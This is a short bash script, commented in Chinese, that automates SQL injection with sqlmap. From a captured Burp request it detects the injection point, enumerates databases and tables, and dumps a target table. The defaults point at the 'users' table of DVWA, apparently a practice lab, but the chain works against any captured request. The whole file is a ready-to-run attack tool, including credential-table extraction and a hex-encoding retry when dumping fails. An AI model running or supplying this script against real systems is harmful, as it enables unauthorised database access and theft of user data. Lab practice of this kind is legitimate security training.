#!/bin/bash

#配置
REQ_FILE=""          # Burp请求文件路径
DB_NAME="dvwa"                  # 数据库名
TABLE_NAME="users"              # 表名
DUMP_DATA=true                  # 是否导出数据 (true/false)


# 颜色
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

# 检查sqlmap
if ! command -v sqlmap &> /dev/null; then
    echo -e "${RED}[-] sqlmap未安装，请执行: sudo apt install sqlmap${NC}"
    exit 1
fi

# 检查请求文件
if [ ! -f "$REQ_FILE" ]; then
    echo -e "${RED}[-] 请求文件不存在: $REQ_FILE${NC}"
    echo -e "${YELLOW}[!] 请确保文件在: $(pwd)/$REQ_FILE${NC}"
    exit 1
fi

echo -e "${GREEN}[+] 使用请求文件: $REQ_FILE${NC}"
echo -e "${GREEN}[+] 目标数据库: $DB_NAME${NC}"
echo -e "${GREEN}[+] 目标表: $TABLE_NAME${NC}"

# 检测注入点
echo -e "${GREEN}[*] 1/4 检测注入点...${NC}"
sqlmap -r "$REQ_FILE" --batch --flush-session

# 枚举数据库
echo -e "${GREEN}[*] 2/4 枚举数据库...${NC}"
sqlmap -r "$REQ_FILE" --dbs --batch

# 枚举表
echo -e "${GREEN}[*] 3/4 枚举 $DB_NAME 数据库的表...${NC}"
sqlmap -r "$REQ_FILE" -D "$DB_NAME" --tables --batch

# 枚举字段并导出数据
if [ "$DUMP_DATA" = true ]; then
    echo -e "${GREEN}[*] 4/4 导出 $DB_NAME.$TABLE_NAME 表数据...${NC}"
    sqlmap -r "$REQ_FILE" -D "$DB_NAME" -T "$TABLE_NAME" --dump --batch
    
    if [ $? -ne 0 ]; then
        echo -e "${YELLOW}[!] 导出失败，尝试添加 --hex 参数...${NC}"
        sqlmap -r "$REQ_FILE" -D "$DB_NAME" -T "$TABLE_NAME" --dump --hex --batch
    fi
else
    # 只枚举字段，不导出数据
    echo -e "${GREEN}[*] 4/4 枚举 $DB_NAME.$TABLE_NAME 表的字段...${NC}"
    sqlmap -r "$REQ_FILE" -D "$DB_NAME" -T "$TABLE_NAME" --columns --batch
fi

echo -e "${GREEN}[+] 完成！${NC}"